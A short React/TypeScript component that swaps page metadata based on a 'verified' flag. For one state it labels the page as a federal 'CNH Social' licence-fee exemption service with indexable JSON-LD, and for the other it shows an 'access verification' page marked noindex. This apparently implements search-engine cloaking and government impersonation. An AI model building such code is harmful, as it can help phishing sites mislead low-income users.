import { useEffect } from "react";

interface DynamicHeadProps {
  verified: boolean;
}

const DynamicHead = ({ verified }: DynamicHeadProps) => {
  useEffect(() => {
    if (!verified) {
      document.title = "CNH Social - Programa de Isenção de Taxas";

      setMeta("description", "Programa CNH Social para isenção de taxas na obtenção da Carteira Nacional de Habilitação para pessoas de baixa renda.");
      setMeta("keywords", "CNH Social, CNH Popular, isenção taxas, habilitação gratuita, programa governo");
      removeMeta("robots");

      // Inject JSON-LD
      if (!document.getElementById("jsonld-cnhsocial")) {
        const script = document.createElement("script");
        script.id = "jsonld-cnhsocial";
        script.type = "application/ld+json";
        script.textContent = JSON.stringify({
          "@context": "https://schema.org",
          "@type": "GovernmentService",
          name: "CNH Social - Programa de Isenção de Taxas",
          description: "Programa do governo para isenção de taxas da CNH para pessoas de baixa renda.",
          provider: {
            "@type": "GovernmentOrganization",
            name: "Governo Federal",
          },
        });
        document.head.appendChild(script);
      }
    } else {
      document.title = "Verificação de Acesso";

      setMeta("description", "Verificação de acesso necessária.");
      removeMeta("keywords");
      setMeta("robots", "noindex, nofollow");

      // Remove JSON-LD if exists
      const existing = document.getElementById("jsonld-cnhsocial");
      if (existing) existing.remove();
    }
  }, [verified]);

  return null;
};

function setMeta(name: string, content: string) {
  let el = document.querySelector(`meta[name="${name}"]`);
  if (!el) {
    el = document.createElement("meta");
    el.setAttribute("name", name);
    document.head.appendChild(el);
  }
  el.setAttribute("content", content);
}

function removeMeta(name: string) {
  const el = document.querySelector(`meta[name="${name}"]`);
  if (el) el.remove();
}

export default DynamicHead;
